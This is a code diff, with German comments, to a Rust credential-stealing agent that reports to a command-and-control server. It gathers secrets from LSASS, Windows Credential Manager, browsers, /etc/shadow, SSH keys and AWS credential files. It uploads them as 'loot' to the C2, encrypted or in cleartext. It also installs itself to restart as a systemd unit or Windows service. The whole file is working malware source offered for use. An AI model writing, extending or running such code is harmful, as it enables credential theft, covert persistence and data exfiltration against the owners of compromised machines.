@@ -10,10 +10,12 @@ mod propagate;
 mod tasks;
 
 use std::net::Ipv4Addr;
+use std::path::PathBuf;
 
 use clap::Parser;
 
-use crate::hostkey::versiegel;
+use kx_core::persist::Invocation;
+
 use tracing::{error, info};
 
 /// Bearer-Token, dessen Debug-Ausgabe den Wert maskiert.
@@ -88,6 +90,56 @@ struct Args {
     /// unverschluesselt an den C2.
     #[arg(long)]
     server_key: Option<String>,
+}
+
+impl Args {
+    /// Die Invocation, mit der der Agent nach der Installation neu startet.
+    ///
+    /// Die Flag-Liste existiert genau hier. Die Persistenz-Adapter kennen sie
+    /// nicht — sie rendern nur diese Form. Ein neues Argument landet damit
+    /// automatisch in der systemd-Unit und in der `binPath=`-Zeile von
+    /// `sc.exe`, statt in einer zweiten, von Hand gepflegten Liste zu
+    /// verschwinden.
+    ///
+    /// `--server-key` ist Teil der Liste: ohne ihn meldet der neu gestartete
+    /// Agent die Beute im Klartext an den C2.
+    fn persistence_invocation(&self, exe: PathBuf) -> Invocation {
+        let mut args = vec![
+            "--server".to_string(),
+            "${KX_C2_URL}".to_string(),
+            "--token".to_string(),
+            "${KX_C2_TOKEN}".to_string(),
+            "--server-cert".to_string(),
+            self.server_cert.clone(),
+            "--iface".to_string(),
+            self.iface.clone(),
+            "--start".to_string(),
+            self.start.clone(),
+            "--end".to_string(),
+            self.end.clone(),
+            "--own-ip".to_string(),
+            self.own_ip.clone(),
+        ];
+        // Ohne diese Liste scannt der neu gestartete Agent den ganzen Bereich
+        // statt der ursprünglichen Ziele.
+        if let Some(hosts) = &self.hosts {
+            args.push("--hosts".to_string());
+            args.push(hosts.clone());
+        }
+        if let Some(schluessel) = &self.server_key {
+            args.push("--server-key".to_string());
+            args.push(schluessel.clone());
+        }
+        Invocation {
+            name: "kx-agent".to_string(),
+            binary_path: exe,
+            args,
+            env: vec![
+                ("KX_C2_URL".to_string(), self.server.clone()),
+                ("KX_C2_TOKEN".to_string(), self.token.as_str().to_string()),
+            ],
+        }
+    }
 }
 
 #[tokio::main]
@@ -225,136 +277,84 @@ async fn main() {
 ///
 /// Jedes Secret bekommt die Host-Kennung des Agenten mit — die Kennung des Hosts,
 /// bei dem es erbeutet wurde. Das ist hier der Agent selbst.
+///
+/// Die Extraktoren liefern dieselbe Form (`kx_core::secret::Secret`), deshalb
+/// ist der Weg von der Extraktion zum Upload eine Schleife statt vier
+/// kopierter Blöcke. Die Quelle des Stücks steht im Secret — sie kommt vom
+/// Extraktor, der sie am besten kennt.
 async fn collect_local_secrets(
     host_id: &str,
     schluessel: Option<hostkey::SealedHostKey>,
 ) -> Vec<kx_core::c2::SecretUpload> {
-    let mut out = Vec::new();
+    let mut secrets: Vec<kx_core::secret::Secret> = Vec::new();
     #[cfg(target_os = "windows")]
     {
-        for secret in kx_win::extract_lsass().await.unwrap_or_default() {
-            let (versiegelt, klartext) = versiegel(&schluessel, &secret.value);
-            out.push(
-                kx_core::c2::SecretUpload {
-                    host_id: host_id.to_string(),
-                    cred_type: secret.secret_type,
-                    username: secret.target,
-                    password: String::new(),
-                    source: Some("lsass".into()),
-                    master_key: None,
-                    sealed_password: None,
-                }
-                .mit_versiegeltem_passwort(versiegelt)
-                .mit_passwort(&klartext),
-            );
-        }
-        for secret in kx_win::extract_credential_manager()
-            .await
-            .unwrap_or_default()
-        {
-            let (versiegelt, klartext) = versiegel(&schluessel, &secret.value);
-            out.push(
-                kx_core::c2::SecretUpload {
-                    host_id: host_id.to_string(),
-                    cred_type: "credential_manager".into(),
-                    username: secret.target,
-                    password: String::new(),
-                    source: Some("cmdkey".into()),
-                    master_key: None,
-                    sealed_password: None,
-                }
-                .mit_versiegeltem_passwort(versiegelt)
-                .mit_passwort(&klartext),
-            );
-        }
+        secrets.extend(kx_win::extract_lsass().await.unwrap_or_default());
+        secrets.extend(
+            kx_win::extract_credential_manager()
+                .await
+                .unwrap_or_default(),
+        );
+        secrets.extend(
+            kx_win::extract_browser_credentials()
+                .await
+                .unwrap_or_default(),
+        );
     }
     #[cfg(unix)]
     {
-        for secret in kx_posix::extract_shadow_hashes().await.unwrap_or_default() {
-            let (versiegelt, klartext) = versiegel(&schluessel, &secret.value);
-            out.push(
-                kx_core::c2::SecretUpload {
-                    host_id: host_id.to_string(),
-                    cred_type: "shadow".into(),
-                    username: secret.target,
-                    password: String::new(),
-                    source: Some("/etc/shadow".into()),
-                    master_key: None,
-                    sealed_password: None,
-                }
-                .mit_versiegeltem_passwort(versiegelt)
-                .mit_passwort(&klartext),
-            );
-        }
-        for secret in kx_posix::extract_aws_credentials()
-            .await
-            .unwrap_or_default()
-        {
-            let (versiegelt, klartext) = versiegel(&schluessel, &secret.value);
-            out.push(
-                kx_core::c2::SecretUpload {
-                    host_id: host_id.to_string(),
-                    cred_type: "aws".into(),
-                    username: secret.target,
-                    password: String::new(),
-                    source: Some("~/.aws/credentials".into()),
-                    master_key: None,
-                    sealed_password: None,
-                }
-                .mit_versiegeltem_passwort(versiegelt)
-                .mit_passwort(&klartext),
-            );
-        }
+        secrets.extend(kx_posix::extract_shadow_hashes().await.unwrap_or_default());
+        secrets.extend(kx_posix::extract_ssh_keys().await.unwrap_or_default());
+        secrets.extend(
+            kx_posix::extract_aws_credentials()
+                .await
+                .unwrap_or_default(),
+        );
     }
-    out
+
+    // Der Master-Key gehoert zum Host, von dem das Stueck stammt. Ohne ihn
+    // geht die Beute im Klartext an den C2 — der dokumentierte Normalfall
+    // eines Agenten ohne Server-Schluessel.
+    let master_key = schluessel.as_ref().map(|k| k.roh.as_slice());
+
+    secrets
+        .into_iter()
+        .filter_map(|secret| {
+            match kx_core::exfil::ExfiltratedSecret::new(&secret, master_key).upload(host_id) {
+                Ok(upload) => Some(upload),
+                // Der Klartext geht nicht als Ersatz raus — das Stueck bleibt.
+                Err(e) => {
+                    error!("Beute nicht versiegelbar, sie bleibt hier: {e}");
+                    None
+                }
+            }
+        })
+        .collect()
 }
 
 /// Installiert Persistenz (Windows oder POSIX).
 ///
-/// Unter unix erzeugt die Unit einen vollständigen `ExecStart`: der Agent
-/// braucht `--server`, `--server-cert`, `--start` und `--end`, sonst startet
-/// er nicht. Zusammen mit `Restart=always` ergibt ein leerer `ExecStart` eine
-/// Neustart-Schleife.
+/// Der Agent startet danach mit derselben Invocation neu, mit der er jetzt
+/// läuft — die Flag-Liste steht in [`Args::persistence_invocation`] und sonst
+/// nirgends. Fehlt ein Pflichtargument, startet der Dienst gar nicht; fehlt
+/// `--server-key`, meldet er die Beute im Klartext.
 ///
-/// Das Token steht **nicht** in der Unit-Datei — die ist für jeden lesbar,
-/// der die Datei lesen darf. Es landet in einer Environment-Datei mit 0600 und
-/// wird von systemd als `${KX_C2_TOKEN}` in den `ExecStart` eingesetzt. Der
-/// Agent liest es damit aus der Umgebung, wo es auch ohnehin liegt
-/// (`env = "KX_C2_TOKEN"` am Clap-Attribut).
+/// Unter Unix landen Token und URL in einer Environment-Datei mit 0600 und
+/// werden von systemd als `${KX_C2_TOKEN}` in den `ExecStart` eingesetzt. Die
+/// Unit-Datei selbst ist für jeden lesbar, der die Datei lesen darf — dort
+/// steht kein Geheimnis. Unter Windows gibt es keine Environment-Datei für
+/// `sc.exe`; die Werte stehen dort in der Befehlszeile.
 async fn install_persistence(args: &Args) -> Result<(), Box<dyn std::error::Error>> {
     let exe = std::env::current_exe()?;
+    let invocation = args.persistence_invocation(exe);
     #[cfg(target_os = "windows")]
     {
-        kx_win::install_service("kx-agent", &exe, "Kx Agent").await?;
-        kx_win::start_service("kx-agent").await?;
+        kx_win::install_service(&invocation, "Kx Agent").await?;
+        kx_win::start_service(&invocation.name).await?;
     }
     #[cfg(unix)]
     {
-        let svc = kx_posix::SystemdService {
-            name: "kx-agent".to_string(),
-            binary_path: exe,
-            args: vec![
-                "--server".to_string(),
-                "${KX_C2_URL}".to_string(),
-                "--token".to_string(),
-                "${KX_C2_TOKEN}".to_string(),
-                "--server-cert".to_string(),
-                args.server_cert.clone(),
-                "--iface".to_string(),
-                args.iface.clone(),
-                "--start".to_string(),
-                args.start.clone(),
-                "--end".to_string(),
-                args.end.clone(),
-                "--own-ip".to_string(),
-                args.own_ip.clone(),
-            ],
-            env: vec![
-                ("KX_C2_URL".to_string(), args.server.clone()),
-                ("KX_C2_TOKEN".to_string(), args.token.as_str().to_string()),
-            ],
-        };
-        kx_posix::install_systemd_service(&svc).await?;
+        kx_posix::install_systemd_service(&invocation).await?;
     }
     Ok(())
 }
@@ -397,5 +397,45 @@ mod tests {
     fn token_bleibt_als_text_lesbar() {
         let args = args_mit_token("hochgeheim-1234");
         assert_eq!(args.token.as_str(), "hochgeheim-1234");
+    }
+
+    #[test]
+    fn die_persistenz_invocation_traegt_alle_pflichtargumente() {
+        let mut args = args_mit_token("geheim");
+        args.server_key = Some("/etc/kx/server-pub.json".to_string());
+        let inv = args.persistence_invocation(PathBuf::from("/usr/local/bin/kx-agent"));
+        let joined = inv.args.join(" ");
+
+        for flag in [
+            "--server",
+            "--token",
+            "--server-cert",
+            "--iface",
+            "--start",
+            "--end",
+            "--own-ip",
+            "--server-key",
+        ] {
+            assert!(
+                joined.contains(flag),
+                "{flag} fehlt in der Invocation: {joined}"
+            );
+        }
+    }
+
+    #[test]
+    fn die_persistenz_invocation_verbirgt_kein_geheimnis_in_den_argumenten() {
+        let args = args_mit_token("hochgeheim-1234");
+        let inv = args.persistence_invocation(PathBuf::from("/usr/local/bin/kx-agent"));
+        let joined = inv.args.join(" ");
+
+        assert!(
+            !joined.contains("hochgeheim-1234"),
+            "das Token steht im Klartext in den Argumenten: {joined}"
+        );
+        assert!(
+            joined.contains("${KX_C2_TOKEN}"),
+            "der Platzhalter für das Token fehlt: {joined}"
+        );
     }
 }
